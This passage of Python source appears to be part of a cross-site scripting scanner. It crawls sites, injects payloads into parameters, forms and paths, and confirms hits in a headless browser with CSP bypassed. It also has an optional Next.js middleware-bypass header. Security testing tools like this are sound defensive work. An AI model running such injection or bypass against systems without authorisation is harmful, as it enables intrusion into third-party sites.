        payload_set = list(dict.fromkeys(self.payloads + self.ctx_payloads.get(content_type, []) + PayloadManager.BLIND_PAYLOADS))
        payload_set = payload_set[:CF.get("max_payloads_per_param")]
        vulns: List[asyncio.Task] = []
        for param, orig in [(k, v) for k, v in qs if k in refl]:
            for pay in payload_set:
                async def do_inject(p=param, pay=pay, orig=orig) -> VulnResult:
                    inj = orig + (pay if pay.startswith('"') else '">'+pay)
                    new_q = [(k, inj if k == p else v) for k, v in qs]
                    inj_url = urlunparse(parsed._replace(query=urlencode(new_q)))
                    token = f"MetaX_{random.randint(10000,99999)}"
                    status, resp, _, resp_latency = await self.rm.do_request(inj_url, "GET")
                    score, reason = ScoreEngine.compute_score(pay, baseline, resp or "", base_latency, resp_latency)
                    progress.update(task_id, advance=1)
                    result = VulnResult(inj_url, "GET", p, pay, score, token, False, "", reason, resp_time=resp_latency)
                    self.plugin_manager.run_plugins(result)
                    return result
                vulns.append(asyncio.create_task(do_inject()))
        results = await asyncio.gather(*vulns)
        return [r for r in results if r.score > 0]

    async def inject_forms(self, url: str, baseline: str, base_latency: float, progress: Progress, task_id: int) -> List[VulnResult]:
        vulns: List[asyncio.Task] = []
        soup = BeautifulSoup(baseline, BS_PARSER)
        forms = soup.find_all("form")
        for form in forms:
            if len(form.find_all("form")) > 1:
                continue
            action = form.get("action") or url
            full_url = urljoin(url, action)
            method = (form.get("method") or "GET").upper()
            fields = [el for el in form.find_all(["input", "textarea", "select"]) if el.get("name")]
            if not fields:
                continue
            for pay in self.payloads + PayloadManager.BLIND_PAYLOADS:
                async def do_form(pn=fields[0].get("name"), pay=pay) -> VulnResult:
                    data = {el.get("name"): (el.get("value") or "test") for el in fields}
                    target = pn
                    data[target] = data.get(target, "test") + (pay if pay.startswith('"') else '">'+pay)
                    inj_url = urlunparse(urlparse(full_url)._replace(query=urlencode(data)))
                    st, resp, _, resp_latency = await self.rm.do_request(inj_url, "GET" if method=="GET" else "POST", data=data)
                    score, reason = ScoreEngine.compute_score(pay, baseline, resp or "", base_latency, resp_latency)
                    progress.update(task_id, advance=1)
                    result = VulnResult(inj_url, method, target, pay, score, None, False, "", reason, resp_time=resp_latency)
                    self.plugin_manager.run_plugins(result)
                    return result
                vulns.append(asyncio.create_task(do_form()))
        return await asyncio.gather(*vulns)

    async def inject_path_payloads(self, url: str, baseline: str, base_latency: float, progress: Progress, task_id: int) -> List[VulnResult]:
        vulns: List[asyncio.Task] = []
        for pay in PayloadManager.PATH_PAYLOADS:
            injected_url = inject_in_url_path(url, pay.replace("{rand}", str(random.randint(10000, 99999))))
            async def do_path_inject(pay=pay) -> VulnResult:
                token = f"MetaX_{random.randint(10000,99999)}"
                status, resp, _, resp_latency = await self.rm.do_request(injected_url, "GET")
                score, reason = ScoreEngine.compute_score(pay, baseline, resp or "", base_latency, resp_latency)
                progress.update(task_id, advance=1)
                result = VulnResult(injected_url, "GET", "PATH", pay, score, token, False, "", reason, resp_time=resp_latency)
                self.plugin_manager.run_plugins(result)
                return result
            vulns.append(asyncio.create_task(do_path_inject()))
        results = await asyncio.gather(*vulns)
        return [r for r in results if r.score > 0]

    async def crawl_website(self, url: str) -> Set[str]:
        crawler = Crawler(self.rm, max_depth=CF.get("crawl_depth", 3))
        discovered = await crawler.crawl(url, 0)
        return discovered

    def save_results_realtime(self, findings: List[VulnResult]) -> None:
        output_path = Path(CF.get("output_dir")) / CF.get("realtime_file")
        results_data = {
            "metadata": {"timestamp": time.strftime('%Y-%m-%d %H:%M:%S'), "findings": len(findings)},
            "results": [{
                "url": f.url,
                "method": f.method,
                "param": f.param,
                "payload": f.payload,
                "score": f.score,
                "verified": f.verified,
                "severity": f.severity,
                "reason": f.reason,
                "pass_count": f.pass_count,
                "resp_time": f.resp_time,
                "verification_details": f.verification_details,
                "trigger_conditions": f.trigger_conditions,
                "mitigation": f.mitigation
            } for f in findings]
        }
        try:
            with output_path.open("w", encoding="utf-8") as f:
                json.dump(results_data, f, indent=2, ensure_ascii=False)
            console.print(f"[info]Realtime results updated: [highlight]{output_path}[/highlight][/info]")
        except Exception as e:
            logger.debug(f"Realtime save error: {e}")

    async def run_injection(self, url: str, progress: Progress, task_id: int) -> List[VulnResult]:
        baseline, metadata, base_latency = await self.get_baseline(url)
        refl_task = progress.add_task("[dim]Reflection Check[/dim]", total=len(parse_qsl(urlparse(url).query, keep_blank_values=True)), visible=True)
        refl = await self.detect_reflections(url, progress, refl_task)
        progress.update(refl_task, visible=False)
        params_vulns = await self.inject_params(url, baseline, base_latency, refl, metadata, progress, task_id)
        form_vulns = await self.inject_forms(url, baseline, base_latency, progress, task_id)
        path_vulns = await self.inject_path_payloads(url, baseline, base_latency, progress, task_id)
        return params_vulns + form_vulns + path_vulns

    async def browser_verify(self, findings: List[VulnResult], progress: Progress, task_id: int) -> List[VulnResult]:
        if not findings:
            return []
        console.print("[info]Starting browser verification...[/info]")
        try:
            async with async_playwright() as p:
                extra_http_headers = {}
                if CF.get("nextjs_bypass"):
                    extra_http_headers["x-middleware-subrequest"] = CF.get("nextjs_bypass_payload")
                browser_launcher = {"chromium": p.chromium, "firefox": p.firefox, "webkit": p.webkit}.get(CF.get("browser_type"), p.chromium)
                browser = await browser_launcher.launch(headless=True, args=[
                    "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
                    "--disable-setuid-sandbox", "--no-first-run", "--no-zygote"
                ])
                context = await browser.new_context(user_agent=CF.get("browser_user_agent"),
                                                    viewport=CF.get("viewport"),
                                                    java_script_enabled=True,
                                                    bypass_csp=True,
                                                    extra_http_headers=extra_http_headers)
                async def verify_one(v: VulnResult) -> VulnResult:
                    async with asyncio.Semaphore(CF.get("browser_concurrency")):
                        v.pass_count = 0
                        logs: List[str] = []
                        success = 0
                        for attempt in range(CF.get("browser_retry_attempts") + 1):
                            page = None
                            try:
                                page = await context.new_page()
                                await page.add_init_script(BROWSER_HOOK)
                                for _ in range(CF.get("browser_passes")):
                                    v.pass_count += 1
                                    if v.method.upper() == "POST":
                                        content = (
                                            f"<html><body>"
                                            f"<form id='f' method='POST' action='{html.escape(v.url)}'>"
                                            f"<input name='{html.escape(v.param)}' value='{html.escape(v.payload)}'/>"
                                            f"</form>"
                                            f"<script>document.getElementById('f').submit();</script>"
                                            f"</body></html>"
                                        )
                                        await page.set_content(content, wait_until="networkidle", timeout=CF.get("browser_timeout")*1000)
                                    else:
                                        try:
                                            await page.goto(v.url, wait_until="networkidle", timeout=CF.get("browser_timeout")*1000)
                                        except Exception as e:
                                            logs.append(f"Nav error: {str(e)}")
                                    await asyncio.sleep(CF.get("browser_wait"))
                                    triggered = await page.evaluate("window.__METAXLOG") or []
                                    logs.append(f"Pass {v.pass_count}: {triggered}")
                                    if any(evt in t for t in triggered for evt in ["alert:", "confirm:", "prompt:"]):
                                        success += 1
                                    await asyncio.sleep(0.5)
                                trigger_count = sum(1 for t in triggered if any(evt in t for evt in ["alert:", "confirm:", "prompt:"]))
                                if (success / CF.get("browser_passes")) >= CF.get("required_success_rate"):
                                    v.verified = True
                                    additional = 80 + min(20, trigger_count * 5)
                                    v.score = min(100, v.score + additional)
                                    v.severity = "Critical" if v.score >= 95 else "High" if v.score >= 85 else "Medium" if v.score >= 70 else "Low"
                                    v.trigger_conditions = {"triggers": triggered, "count": trigger_count}
                                    break
                                else:
                                    v.verified = False
                                    v.reason += f" | Browser: {success}/{CF.get('browser_passes')}"
                                v.verification_details = " | ".join(logs)
                            except Exception as e:
                                logs.append(f"Browser error (attempt {attempt+1}): {str(e)}")
                                await asyncio.sleep(1)
                            finally:
                                if page:
                                    try:
                                        await page.close()
                                    except Exception:
                                        pass
                        progress.update(task_id, advance=1)
                        return v
                results: List[VulnResult] = []
                for i in range(0, len(findings), CF.get("browser_batch_size")):
                    batch = findings[i:i+CF.get("browser_batch_size")]
                    results.extend(await asyncio.gather(*(verify_one(v) for v in batch)))
                    if CF.get("enable_gc_during_verification"):
                        import gc; gc.collect()
                await context.close()
                await browser.close()
                return results
        except Exception as e:
            logger.error(f"Browser verification critical error: {e}")
            return findings

    async def run_scan(self, urls: List[str], use_browser: bool = True, out_file: Optional[str] = None) -> None:
        async with self.rm:
            targets = set()
            console.print("[step]Crawling for URLs...[/step]")
            for url in urls:
                if is_interesting(url):
                    targets.add(url)
                    targets.update(await self.crawl_website(url))
            if not targets:
                console.print("[error]No interesting URLs to scan.[/error]")
                return
            start = time.time()
            console.rule("[step]Starting MetaX Scan[/step]")
            conc = AdaptiveScheduler.concurrency(CF.get("max_concurrency"))
            console.print(f"[info]Scanning [highlight]{len(targets)}[/highlight] URL(s) with adaptive concurrency: [highlight]{conc}[/highlight]. Browser verification: [highlight]{use_browser}[/highlight]")
            if CF.get("scan_mode") == "quick":
                CF["max_payloads_per_param"] = 5; CF["baseline_samples"] = 1
            elif CF.get("scan_mode") == "deep":
                CF["max_payloads_per_param"] = 15; CF["baseline_samples"] = 5
            total_tasks = sum(len(parse_qsl(urlparse(u).query, keep_blank_values=True))*(1+len(self.payloads)) for u in targets)
            aggregated_findings: List[VulnResult] = []
            try:
                with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), TimeElapsedColumn(), TimeRemainingColumn(), console=console) as progress:
                    inj_task = progress.add_task("Injection Phase", total=total_tasks)
                    inj_tasks = [self.run_injection(u, progress, inj_task) for u in targets]
                    for future in asyncio.as_completed(inj_tasks):
                        findings = await future
                        aggregated_findings.extend(findings)
                        self.save_results_realtime(aggregated_findings)
                table = Table(title="Injection Results", expand=True)
                table.add_column("URL", overflow="fold")
                table.add_column("Param", overflow="fold")
                table.add_column("Payload", overflow="fold")
                table.add_column("Score", justify="right")
                for f in sorted(aggregated_findings, key=lambda x: x.score, reverse=True):
                    table.add_row(f.url, str(f.param), f.payload, str(f.score))
                console.print(table)
                if use_browser and aggregated_findings:
                    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), TimeElapsedColumn(), TimeRemainingColumn(), console=console) as progress:
                        ver_task = progress.add_task("Browser Verification", total=len(aggregated_findings))
                        aggregated_findings = await self.browser_verify(aggregated_findings, progress, ver_task)
            finally:
                pass
            final = [v for v in aggregated_findings if (v.verified if CF.get("require_verification") and use_browser else v.score >= CF.get("score_filter"))]
            sev_order = {"Critical": 3, "High": 2, "Medium": 1, "Low": 0}
            final.sort(key=lambda f: (sev_order.get(f.severity, 0), f.score), reverse=True)
            elapsed = time.time() - start
            output_path = timestamped_file("metax_scan")
            results_data = {
                "metadata": {"scan_time": elapsed, "targets": len(targets), "findings": len(final),
                             "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')},
                "results": [{
                    "url": f.url,
                    "method": f.method,
                    "param": f.param,
                    "payload": f.payload,
                    "score": f.score,
                    "verified": f.verified,
                    "severity": f.severity,
                    "reason": f.reason,
                    "pass_count": f.pass_count,
                    "resp_time": f.resp_time,
                    "verification_details": f.verification_details,
                    "trigger_conditions": f.trigger_conditions,
                    "mitigation": f.mitigation
                } for f in final]
            }
            with output_path.open("w", encoding="utf-8") as f:
                json.dump(results_data, f, indent=2, ensure_ascii=False)
            console.rule("[success]Scan Complete[/success]")
            console.print(Panel(f"Finished in {elapsed:.2f}s\nResults saved to: [highlight]{output_path}[/highlight]", style="bold bright_green"))
            res_table = Table(title="Final MetaX Findings", expand=True)
            res_table.add_column("✔", justify="center", style="bold")
            res_table.add_column("Score", justify="right")
            res_table.add_column("Severity", justify="center")
            res_table.add_column("Method", justify="center")
            res_table.add_column("Param", overflow="fold")
            res_table.add_column("URL", overflow="fold")
            res_table.add_column("Payload", overflow="fold")
            res_table.add_column("Reason", overflow="fold")
            res_table.add_column("Pass", justify="center")
            color_map = {"Critical": "[critical]", "High": "[bold bright_red]", "Medium": "[bold bright_cyan]", "Low": "[bold bright_white]"}
            for r in final:
                check = "[green]✔[/green]" if r.verified else "[red]✘[/red]"
                col = color_map.get(r.severity, "[bold bright_white]")
                res_table.add_row(check, str(r.score), f"{col}{r.severity}[/]", r.method, str(r.param), r.url, r.payload, r.reason, str(r.pass_count))
            console.print(res_table)
            console.print(Panel(f"Total Findings: [bold]{len(final)}[/bold]\nScan Time: [bold]{elapsed:.2f}s[/bold]", title="[bold bright_green]Summary[/bold bright_green]"))
            if CF.get("dashboard_enabled"):
                console.print("[info]Dashboard integration not implemented yet.[/info]")

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser("Next-Gen MetaX Scanner - Advanced Edition")
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-f", "--file", help="File with URLs (one per line)")
    parser.add_argument("-b", "--browser", action="store_false", help="Disable browser verification")
    parser.add_argument("-o", "--output", help="Output JSON file path")
    parser.add_argument("-m", "--mode", choices=["quick", "deep", "comprehensive"],
                        default=CF.get("scan_mode"), help="Select scanning mode")
    return parser.parse_args()

def main() -> None:
    args = parse_args()
    CF["scan_mode"] = args.mode
    urls: List[str] = []
    if args.url:
        if validators.url(args.url) and is_interesting(args.url):
            urls.append(args.url)
        else:
            console.print("[error]Invalid or uninteresting URL.[/error]")
    if args.file and os.path.isfile(args.file):
        with open(args.file, "r", encoding="utf-8") as f:
            urls.extend({l.strip() for l in f if validators.url(l.strip()) and is_interesting(l.strip())})
    if urls:
        asyncio.run(XSSScanner().run_scan(urls, use_browser=args.browser, out_file=args.output))
        sys.exit(0)
    state = {"browser_verify": True}
    while True:
        console.clear()
        console.print("[highlight]=== Next-Gen MetaX Scanner ===[/highlight]")
        menu = ("[info]1.[/info] Single URL\n[info]2.[/info] Batch File\n[info]3.[/info] Toggle Browser Verification (current: " +
                str(state['browser_verify']) + ")\n[info]4.[/info] Exit")
        console.print(menu)
        choice = Prompt.ask("[step]Select Option[/step]", choices=["1", "2", "3", "4"], default="1")
        if choice == "1":
            u = Prompt.ask("[info]Enter a URL[/info]").strip()
            if not validators.url(u):
                console.print("[error]Invalid URL.[/error]")
                continue
            if not is_interesting(u):
                console.print("[warning]URL appears static.[/warning]")
            asyncio.run(XSSScanner().run_scan([u], use_browser=state["browser_verify"]))
            Prompt.ask("Press Enter to continue...")
        elif choice == "2":
            fp = Prompt.ask("[info]Enter file path[/info]").strip()
            if not os.path.isfile(fp):
                console.print("[error]File not found![/error]")
                continue
            with open(fp, "r", encoding="utf-8") as f:
                urls = {l.strip() for l in f if validators.url(l.strip()) and is_interesting(l.strip())}
            if not urls:
                console.print("[error]No valid URLs found.[/error]")
                continue
            asyncio.run(XSSScanner().run_scan(list(urls), use_browser=state["browser_verify"]))
            Prompt.ask("Press Enter to continue...")
        elif choice == "3":
            state["browser_verify"] = not state["browser_verify"]
            console.print(f"[info]Browser verification set to: {state['browser_verify']}[/info]")
        else:
            console.print("[success]Exiting. Stay safe![/success]")
            break

if __name__ == "__main__":
    main()
